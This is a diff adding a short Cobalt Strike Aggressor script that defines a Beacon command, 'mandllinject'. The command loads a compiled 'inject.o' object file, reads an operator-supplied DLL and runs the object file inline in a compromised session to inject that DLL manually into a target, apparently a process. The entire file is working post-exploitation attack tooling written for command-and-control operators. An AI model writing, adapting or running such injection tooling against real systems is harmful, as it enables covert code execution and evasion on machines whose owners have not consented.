@@ -1,0 +1,23 @@
+alias mandllinject {
+	local('$handle $data $args $fileData');
+	
+	# figure out the arch of this session
+	$barch = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("inject.o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$dll_handle = openf($2);
+	$file_data = readb($dll_handle, -1);
+	closef($dll_handle);
+
+	# pack our arguments
+	$args = bof_pack($1, "bi", $file_data, $3);
+	
+	btask($1, "Manual DLL Inject - @tomcarver_");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
